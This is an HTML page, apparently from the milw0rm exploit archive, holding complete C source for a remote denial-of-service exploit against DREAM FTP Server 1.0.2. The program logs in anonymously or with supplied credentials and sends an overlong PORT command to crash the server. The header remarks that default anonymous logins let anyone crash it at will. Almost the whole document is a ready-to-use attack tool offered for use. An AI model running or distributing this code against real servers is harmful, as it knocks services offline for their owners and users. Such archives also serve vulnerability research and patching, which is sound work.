<html><head><title>DREAM FTP Server 1.0.2 (PORT) Remote Denial of Service Exploit</title></head><pre>/*
=============================================================
DREAM FTP Server 1.0.2 (PORT) Denial of Service Exploit
=============================================================
Discovered by: InTeL
*Tested on DREAM FTP v1.02 on Windows XP SP2*

Dream FTP v1.02 also has anonymous logins enabled by default 
which enables anyone to crash the server at will.
But if the anonymous logins have been disabled try it with 
a another user/pass account

Shoutz: bryan@top-notch.ws , Digerati, Erazerz, everyone else u kno who u are
*/

#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#pragma comment(lib,&quot;wsock32.lib&quot;)

int usage(char *);


int usage(char *filename)
{
	   printf(&quot;Dream FTP v1.02 DoS exploit\r\n&quot;);
	   printf(&quot;By InTeL\r\n&quot;);
	   printf(&quot;USAGE: %s &lt;IP_Address&gt; &lt;port&gt;\r\n&quot;, filename);

	exit(0);
}

int main(int argc, char *argv[])
{
	char evilbuf[40], recvbuf[1028];
	unsigned short port;
	struct sockaddr_in saddr;
	struct hostent *he;
	WSADATA wsaData;
	SOCKET sock;

	if(argc != 3)
		usage(argv[0]);

	port = atoi(argv[2]);	
	if(WSAStartup(MAKEWORD(2,2), &amp;wsaData) != 0){
		printf(&quot;Unable to initialize Winsock \n&quot;);
		exit(1);
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
		printf(&quot;Socket Error \n&quot;);
		exit(1);
	}

	if ((he = gethostbyname(argv[1])) == NULL){  
		printf(&quot;Couldnt Resolve %s \n&quot;,argv[1]);
		exit(1);
	}

	memset(&amp;saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr = *((struct in_addr *)he-&gt;h_addr);	
	saddr.sin_port = htons(port);

	if (connect(sock, (struct sockaddr *)&amp;saddr, sizeof(saddr)) == SOCKET_ERROR){
		printf(&quot;Connect Error \n&quot;);
      	exit(1);
	}

	for(int i = 0; i&lt;3;i++){
		memset(recvbuf, 0, sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
	}
	printf(&quot;Logging in\r\n&quot;);	

	memset(evilbuf, 0,sizeof(evilbuf));
	strcpy(evilbuf, &quot;USER Anonymous\r\n&quot;); //USER
	send (sock, evilbuf, strlen(evilbuf), 0);
   
	for(i=0;i&lt;4;i++){
		memset(recvbuf,0,sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
   	}
   
	memset(evilbuf, 0, sizeof(evilbuf));
	strcpy(evilbuf, &quot;PASS Anonymous\r\n&quot;); //PASS
	send (sock, evilbuf, strlen(evilbuf), 0);

	for(i=0; i&lt;3;i++) {
		memset(recvbuf, 0, sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
   	}
	printf(&quot;Building overflow string\r\n&quot;);

	memset(evilbuf,0,sizeof(evilbuf));
	strcpy(evilbuf, &quot;PORT &quot;);  //PORT 
	for(i = 5;i != 36;i++)
		evilbuf[i] = 'A';
   	strcat(evilbuf,&quot;\r\n&quot;);
	
	send (sock, evilbuf, strlen(evilbuf), 0);  
   
	printf(&quot;DoS Attack Done\r\n&quot;);
	closesocket(sock);

	return 0;
}

// milw0rm.com [2006-12-21]</pre></html>